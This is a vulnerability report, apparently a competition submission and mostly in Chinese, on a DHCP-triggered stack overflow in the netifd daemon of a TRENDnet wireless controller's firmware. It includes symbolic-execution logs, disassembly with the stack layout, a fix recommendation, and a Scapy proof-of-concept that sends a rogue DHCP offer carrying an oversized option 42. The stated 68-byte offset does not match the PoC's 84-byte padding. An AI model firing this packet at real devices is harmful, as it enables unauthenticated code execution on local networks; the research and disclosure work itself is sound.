# Technical Report: CVE-XXXX-XXXX1: TEW-WLC100P netifd DHCP blobmsg Stack Overflow

## Normalized Submission Metadata

| Field | Value |
|---|---|
| Vendor | TRENDnet |
| Product | TRENDnet TEW-WLC100P Wireless Controller |
| Firmware / Version | v12.07b01 |
| Affected Component | sbin/netifd |
| Vulnerability Type | Stack-based Buffer Overflow / RCE |
| CWE | CWE-121 |
| CVSS | 9.8 Critical |
| Source Material | E:\competition\漏洞\vulns\vulns\vuln-wlc100p-netifd |

## Executive Summary

The team-provided report describes a CVE-level vulnerability in TRENDnet TEW-WLC100P Wireless Controller affecting sbin/netifd. The issue is categorized as Stack-based Buffer Overflow / RCE and is supported by the copied PoC and evidence files in this package.

## Original Technical Detail

The original report is embedded below for reviewer convenience. The untouched copy is also available at source/REPORT.original.md.

---

# CVE-XXXX-XXXX1: TEW-WLC100P netifd DHCP blobmsg Stack Overflow

| 字段 | 值 |
|------|-----|
| CVE ID | 待申请 |
| 厂商 | TRENDnet |
| 产品 | TEW-WLC100P Wireless Controller |
| 固件版本 | v12.07b01（及更早版本） |
| 受影响二进制 | `sbin/netifd` (112,341 bytes, MIPS32 Big-Endian) |
| 漏洞类型 | CWE-121 Stack-based Buffer Overflow |
| CVSS 3.1 | **9.8 Critical** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| 关联已知CVE | CVE-2020-10214 (同类不同产品) |

---

## 1. 漏洞概述

TEW-WLC100P 固件的 `netifd`（Network Interface Daemon）在处理 DHCP 响应的 blobmsg 数据时，`get_env()` 函数（0x411498）使用 `strcpy()` 将 DHCP option 值复制到固定大小的栈缓冲区，**无任何边界检查**。攻击者通过局域网内的恶意 DHCP 服务器发送超长 option 42 (NTP Server) 或 option 6 (DNS Server)，可覆盖栈上的返回地址（`$ra`），实现远程代码执行。

---

## 2. FirmRec 验证证据

### 2.1 Pipeline 验证路径

```
✅ 1.1-1.5 固件解包完成
✅ 2.1-2.4 输入入口分析完成
✅ 3.1-3.3 漏洞签名提取完成
✅ 4.1 LLM相似检测完成
✅ 4.2 输入搜索完成
✅ 4.3 符号利用模拟完成 → 5条路径全部命中0x41414141
✅ 4.4 结果收集完成
```

### 2.2 符号执行结果

```
文件: simexp_results/logs/trendnet@@CVE-2020-10214@@0x4114ac@@netifd@Ex32.log

POC输入:
  ntp_server = "AAAA...AAAA" (128 bytes)
  dns-server = "AAAA...AAAA" (128 bytes)

符号执行摘要:
  Time Elapsed      : 44.6s
  #Total Paths      : 15
  #Uncons Paths     : 5          ← 5条路径到达不可达地址
  Taint Applied     : True       ← 污点追踪已启用
  Timeout           : False

关键路径:
  Return to 0x411644
  Call skip_blob_nest_end @ 0x402b60
  Return to 0x41414141         ← ★ 返回地址被"AAAA"覆盖
  ...
  Schedule Merged 5 returning paths to ['0x41414141'] → 5 paths
```

### 2.3 反汇编证据

```
0x4114AC: addiu $sp, $sp, -104   ; 栈帧 = 104字节
0x4114B8: sw    $ra, 100($sp)    ; 返回地址保存在 $sp+100
0x41165C: jal   0x411498          ; get_env("ntp_server") — strcpy无界
0x4116AC: jal   0x411498          ; get_env("dns-server")
0x4117D0: jal   0x411498          ; get_env("ipv4-address")
...                                (共16次调用)
0x411704: lw    $ra, 100($sp)    ; ★ 攻击者目标：从栈恢复$ra!
```

**栈帧布局：**
```
$sp + 100  [saved $ra]        ← 返回地址
$sp + 96   [saved $s7]
  ...
$sp + 36   [local buffers..]
$sp + 32   [get_env dst 起点]
$sp + 0    栈底
```

**溢出计算：** 缓冲区起点 $sp+32 → 返回地址 $sp+100 = **68 字节即可覆盖 $ra**。

---

## 3. 攻击向量

| 条件 | 说明 |
|------|------|
| 攻击位置 | 局域网 |
| 认证需求 | **无需认证** |
| 触发条件 | WLC100P 通过 DHCP 获取/续租 IP 地址 |
| 利用方式 | 搭建恶意 DHCP 服务器，在 option 42/6 中携带超长 payload |

---

## 4. PoC 概念

```python
# 恶意 DHCP 服务器 — 触发 WLC100P netifd 栈溢出
from scapy.all import *

WLC100P_MAC = "00:11:22:33:44:55"  # 目标 MAC
PAYLOAD = b"A" * 84 + struct.pack(">I", 0x41414141)  # 覆盖$ra

dhcp_offer = (
    Ether(dst=WLC100P_MAC) /
    IP(src="192.168.99.1", dst="255.255.255.255") /
    UDP(sport=67, dport=68) /
    BOOTP(op=2, yiaddr="192.168.99.100", siaddr="192.168.99.1",
          chaddr=bytes.fromhex(WLC100P_MAC.replace(":", ""))) /
    DHCP(options=[
        ("message-type", "offer"),
        ("server_id", "192.168.99.1"),
        ("subnet_mask", "255.255.255.0"),
        ("lease_time", 86400),
        ("router", "192.168.99.1"),
        (42, PAYLOAD.decode("latin-1")),  # NTP server 超长溢出
        ("end")
    ])
)
sendp(dhcp_offer)
```

---

## 5. 修复建议

在 `get_env()` (0x411498) 中使用 `strncpy(dst, value, dst_size-1)` 替代 `strcpy()`，限制最大复制长度。

---

*验证工具: FirmRec CoreTaint + angr 9.2.221*
*证据文件: evidence/Ex32.log (完整符号执行日志)*

